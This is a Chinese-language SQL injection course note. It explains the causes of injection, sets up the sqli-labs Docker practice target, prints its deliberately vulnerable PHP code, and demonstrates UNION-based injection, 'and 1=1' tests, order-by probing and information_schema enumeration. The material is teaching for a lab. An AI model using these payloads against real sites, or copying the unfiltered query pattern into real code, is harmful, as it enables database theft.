在本系列课程学习中，SQL注入漏洞将是重点部分，其中SQL注入又非常复杂，区分各种数据库类型，提交方法，数据类型等注入，我们需要按部就班的学习，才能学会相关SQL注入的核心。同样此类漏洞是WEB安全中严重的安全漏洞，学习如何利用，挖掘，修复也是很重要的。<br />![SQL注入-小迪安全.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1623750701440-910fbead-ad66-48bf-bf97-eb5f58f83565.png#clientId=ue55e1951-cb40-4&from=paste&id=u1bf7efd1&originHeight=1291&originWidth=1288&originalType=binary&ratio=2&rotation=0&showTitle=false&size=213140&status=done&style=none&taskId=u7247397d-db08-4a3e-8847-564b1e2f47a&title=)
<a name="GbneU"></a>
### 一、SQL注入原理

-  1.理解SQL注入<br />	SQL注入是一种将SQL代码插入或添加到应用（用户）的输入参数中的攻击，之后再将这些参数传递给后台的sql服务器加以解析和执行。由于sql语句本身的多样性，以及可用于构造sql语句的编程方法很多，因此凡是构造sql语句的步骤均存在被攻击的潜在风险。Sql注入的方式主要是直接将代码插入参数中，这些参数会被置入sql命令中加以执行。间接的攻击方式是将恶意代码插入字符串中，之后将这些字符串保存到数据库的数据表中或将其当成元数据。当将存储的字符串置入动态sql命令中时，恶意代码就将被执行。

	如果web应用未对动态构造的sql语句使用的参数进行正确性审查（即便使用了参数化技术），攻击者就很可能会修改后台sql语句的构造。如果攻击者能够修改sql语句，那么该语句将与应用的用户具有相同的权限。当使用sql服务器执行与操作系统交互命令时，该进程将与执行命令的组件（如数据库服务器、应用服务器或web服务器）拥有相同的权限，这种权限的级别通常很高。如果攻击者执行以上恶意代码的插入操作成功，那么用户数据库服务器或者整个应用会遭到破坏，甚至被控制。 

-  2.sql注入的产生过程及常见原因 

   -  2.1产生过程<br />	大多数的web应用都需要与数据库进行交互，并且大多数web应用编程语言（如ASP、C##、.NET、Java和PHP）均提供了可编程的方法来与数据库连接并进行交互。如果web应用开发人员无法确保在将从web表单，cookie及输入参数等收到的值传递给sql查询（该查询在数据库服务器上执行）之前已经对其进行过验证，那么通常会出现sql注入漏洞，如果攻击者能够控制发送给sql查询的输入，并且能够操纵该输入将其解析为代码而非数据，那么攻击者就很有可能有能力在后台数据库执行该代码。

 

   -  2.2常见的sql注入产生原因<br />	基于此，SQL注入的产生原因通常表现在以下几方面：①转义字符处理不合适；②不安全的数据库配置；③不合理的查询集处理；④不当的错误处理；⑤多个提交处理不当。 

   -  2.2.1不当的处理类型<br />      Sql数据库将单引号字符（’）解析成代码与数据间的分界线：单引号外面的内容军事需要运行的代码，而用单引号引起来的内容均是数据。因为只需要简单的在URL或WEB页面的字段中输入一个单引号，就能很快速的识别出web站点是否会受到sql注入攻击。 

   -  2.2.2不安全的数据库配置<br />      数据库带有很多默认的用户预安装内容。SQL Server使用声名狼藉的“sa”作为数据库系统管理员账户，MySQL使用“root”和“anonymous”用户账户，Oracle则在创建数据库时通常会创建SYS、SYSTEM、DBSNMP和OUTLN账户。这些并非是全部的账号，知识比较出名的账户中的一部分，还有很多其他的账户。其他账户同样按默认方式进行预设，口令总所周知。
   - <br />     这就带来了很大的安全风险，攻击者利用sql注入漏洞时，通常会常识访问数据库的元数据，比如内部的数据库和表的名称、列的数据类型和访问权限，例如MySQL服务器的元数据位于information_schema虚拟数据库中，可通过show databases；和show tables；命令访问。所有的MySQL用户均有权限访问该数据库中的表，但只能查看表中那些与该用户访问权限相对应的对象的行。

 

   -  2.2.3不合理的查询集处理<br />        有时需要使用动态的sql语句对某些复杂的应用进行编码，因为程序开发阶段可能还不知道要查询的表或字段（或者不存在）。比如与大型数据库交互的应用，这些数据库在定期创建的表中的数据由于应用已经产生了输入，因而开发人员会信任该数据，攻击者可以使用自己的表和字段数据来替换应用产生的值，从而影响系统的返回值。

 

   -  2.2.4不当的错误处理<br />	错误处理不当会为web站点带来很多安全方面的问题。最常见的问题是将详细的内部错误消息（如错误代码，数据库转存储）显示给用户或攻击。这些错误消息会泄露实现细节，为攻击者提供与网站潜在缺陷相关的重要线索。 

   -  2.2.5多个提交处理不当

	大型的web开发项目会出现这样的问题：有些开发人员会对输入进行验证，而一些开发人员则不以为然。对于开发人员，团队，甚至公司来说，彼此独立工作的情形并不少见，很难保证项目中每个人都遵循相同的标准。<br />        应用打开发人员还倾向于围绕用户来设计应用，他们尽可能的使用预期的处理流程来引导用户，认为用户将遵循他们已经设计好的逻辑顺序。<br />        例如：当用户已到达一系列表单中的第三个表单时，他们会期望用户肯定已经完成第一个和第二个表达。但实际上，借助URL乱序来请求资源，能够非常容易的避开预期的数据流程。 

<a name="DBwgH"></a>
### 二、mysql注入
![mysql注入-小迪.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1623825461063-3176cffa-46d5-494a-9149-34dd9d0b44b2.png#clientId=u599e9bf5-3187-4&from=paste&height=394&id=ude1c6462&originHeight=646&originWidth=1232&originalType=binary&ratio=2&rotation=0&showTitle=false&size=115635&status=done&style=none&taskId=u43ab66e9-b5ea-4f79-988a-e771042b4e3&title=&width=752)
<a name="xoTBr"></a>
### 三、忍者系统安装
**参考博客：**[https://blog.csdn.net/qq_35258210/article/details/115457883](https://blog.csdn.net/qq_35258210/article/details/115457883)

将镜像下载好使用VM安装，我给该系统分配了70个G硬盘，6G内存<br />镜像下载链接：链接: [https://pan.baidu.com/s/1CAw9ztIUhCZgydNWHHWINg](https://pan.baidu.com/s/1CAw9ztIUhCZgydNWHHWINg) 密码: a33b

**注意：**<br />**1、**刚开始安装的时候vm可能无法读取到镜像、在进入的时候按enter键，其余的步骤和上面的博客一致、不在赘述。安装完成后截图,由于忍者系统是基于win10开发的而内存也给的相对比较大在使用的过程中很有可能出现卡顿的情况建议使用vm player打开忍者系统。

**2、**开始使用的时候忍者系统有两个网卡建议禁用两个让其中的一个通信<br />密码：toor<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1623812599439-dee380df-7c6a-45d1-a565-ff5feaccab4e.png#clientId=u758715db-407f-4&from=paste&height=302&id=ub65c5f07&originHeight=344&originWidth=850&originalType=binary&ratio=2&rotation=0&showTitle=false&size=27737&status=done&style=none&taskId=u55f98eb3-8f07-411c-a02c-fc12c2fcf88&title=&width=745)<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1623812544952-e0adbd77-fd92-41f9-bdd9-9fe98ec3a490.png#clientId=u758715db-407f-4&from=paste&height=460&id=u78cb61f7&originHeight=920&originWidth=1574&originalType=binary&ratio=2&rotation=0&showTitle=false&size=1573167&status=done&style=none&taskId=ud99cf60c-5cf0-43db-bfe4-4961490a325&title=&width=787)<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1623812729557-3004dfc2-2b82-4fba-98d9-8a83fd215137.png#clientId=u758715db-407f-4&from=paste&height=414&id=u2dd34bdf&originHeight=621&originWidth=1125&originalType=binary&ratio=2&rotation=0&showTitle=false&size=76636&status=done&style=none&taskId=ucc751c7f-fbb9-4bab-9da1-6f70e32df74&title=&width=749.5)
<a name="zCzaP"></a>
### 四、sql注入靶场搭建
```bash
[root@oldjiang ~]# docker pull acgpiano/sqli-labs
[root@oldjiang ~]# docker run -dt --name sqli -p 80:80 -p 13306:3306 --rm acgpiano/sqli-labs
[root@oldjiang ~]# docker exec -it sqli /bin/bash
```
访问![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1623814612177-7b996b60-e876-427d-b11c-2eb8cfbe079f.png#clientId=u599e9bf5-3187-4&from=paste&height=338&id=u931e3a46&originHeight=433&originWidth=954&originalType=binary&ratio=2&rotation=0&showTitle=false&size=36415&status=done&style=none&taskId=u95664b0a-566a-469b-af7c-9dd0d2b9b20&title=&width=745)<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1623816863968-03b39520-736a-4953-9193-393137069010.png#clientId=u599e9bf5-3187-4&from=paste&height=237&id=u095be8b8&originHeight=416&originWidth=1314&originalType=binary&ratio=2&rotation=0&showTitle=false&size=336396&status=done&style=none&taskId=ue5ad6f92-59d2-4edd-9dad-9fc513bc68d&title=&width=748)<br />查看源代码
```bash
root@1f9ac3840241:/# cat /var/www/html/Less-2/index.php
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Less-2 **Error Based- Intiger**</title>
</head>

<body bgcolor="#000000">




<div style=" margin-top:60px;color:#FFF; font-size:23px; text-align:center">Welcome&nbsp;&nbsp;&nbsp;<font color="#FF0000"> Dhakkan </font><br>
<font size="3" color="#FFFF00">


<?php
//including the Mysql connect parameters.
include("../sql-connections/sql-connect.php");
error_reporting(0);
// take the variables
if(isset($_GET['id']))
{
$id=$_GET['id'];
//logging the connection parameters to a file for analysis.
$fp=fopen('result.txt','a');
fwrite($fp,'ID:'.$id."\n");
fclose($fp);


// connectivity
$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);

        if($row)
        {
        echo "<font size='5' color= '#99FF00'>";
        echo 'Your Login name:'. $row['username'];
        echo "<br>";
        echo 'Your Password:' .$row['password'];
        echo "</font>";
        }
        else
        {
        echo '<font color= "#FFFF00">';
        print_r(mysql_error());
        echo "</font>";
        }
}
        else
                {
                echo "Please input the ID as parameter with numeric value";
                }

?>


</font> </div></br></br></br><center>
<img src="../images/Less-2.jpg" /></center>
</body>
</html>

```
**备注：**在上面的代码中可以看到`$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";`直接传递的变量$id带入sql语句中执行没有做任何的限制，这样为恶意代码插入执行创造了条件。通过修改带入的代码执行的语句最终达到SQL注入获取敏感信息

- 在数据库中执行: 

id=-1 是为了让回显的结果为空执行后面union的字句。
```bash
mysql> select * from users;
+----+----------+------------+
| id | username | password   |
+----+----------+------------+
|  1 | Dumb     | Dumb       |
|  2 | Angelina | I-kill-you |
|  3 | Dummy    | p@ssword   |
|  4 | secure   | crappy     |
|  5 | stupid   | stupidity  |
|  6 | superman | genious    |
|  7 | batman   | mob!le     |
|  8 | admin    | admin      |
|  9 | admin1   | admin1     |
| 10 | admin2   | admin2     |
| 11 | admin3   | admin3     |
| 12 | dhakkan  | dumbo      |
| 14 | admin4   | admin4     |
+----+----------+------------+
13 rows in set (0.00 sec)

mysql> select * from emails;
+----+------------------------+
| id | email_id               |
+----+------------------------+
|  1 | Dumb@dhakkan.com       |
|  2 | Angel@iloveu.com       |
|  3 | Dummy@dhakkan.local    |
|  4 | secure@dhakkan.local   |
|  5 | stupid@dhakkan.local   |
|  6 | superman@dhakkan.local |
|  7 | batman@dhakkan.local   |
|  8 | admin@dhakkan.com      |
+----+------------------------+
8 rows in set (0.00 sec)

mysql> SELECT * FROM users WHERE id=-1 LIMIT 0,1;			#显示的结果为空、因为没有id=-1的字段
Empty set (0.00 sec)


mysql> SELECT * FROM users WHERE id=-1 union  select 1,email_id,3 from emails LIMIT 0,1;
+----+------------------+----------+
| id | username         | password |
+----+------------------+----------+
|  1 | Dumb@dhakkan.com | 3        |
+----+------------------+----------+
1 row in set (0.00 sec)
```

- 在网页中执行

%20在网页的URL编码中为空格，在id=-2添加代码：union  select 1,email_id,3 from emails<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1623816318576-7d3b351f-af0c-4165-8821-5e1d3c92e6ae.png#clientId=u599e9bf5-3187-4&from=paste&height=187&id=ud3b0ace5&originHeight=298&originWidth=1181&originalType=binary&ratio=2&rotation=0&showTitle=false&size=33133&status=done&style=none&taskId=uec240c1b-35f7-4726-999f-b8618f498e0&title=&width=742.5)<br />**总结：**可控变量，带入数据库查询，变量未存在过滤或过滤不严谨。

测试题:参数x有注入，以下那个注入测试正确?
```bash
a. www.xiaodi8.com/news.php?y=1 and 1=1&x=2
b. www.xiaodi8.com/news.php?y=1&x=2 and 1=1
c. www .xiaodi8.com/news.php?y=1 and 1=1&x=2 and 1=1
d. www .xiaodi8.com/news.php?xx=1 and 1=1&xxx=2 and 1=1
```

- 判断是否存在注入点
```bash
1、逻辑值
    and 1 = 1		页面正常
    and 1 = 2		页面异常
    则可能存在注入点

2、order by
		通过order by 判断注入的字段数
    
```

- 信息收集
```bash
数据库版本：version()
数据库名字：database()
数据库用户：user()
操作系统：@@version_compile_os
```

- 版本探测的意义
```bash
在mysql5.0以后的版本存在一个information_schema数据库、里面存储记录数据库名、表名、列名的数据库
相当于可以通过information_schema这个数据库获取到数据库下面的表名和列名。

```

- 获取相关信息
```bash
information_schema.tables			#information_schema下面的所有表名
information_schema.columns		#information_schema下面所有的列名
table_name										#表名
column_name										#列名
table_schema									#数据库名
```
[SQL注入.pdf](https://www.yuque.com/attachments/yuque/0/2022/pdf/2476579/1647239035090-84752d34-43a3-4d21-953e-612760a5e4d7.pdf)
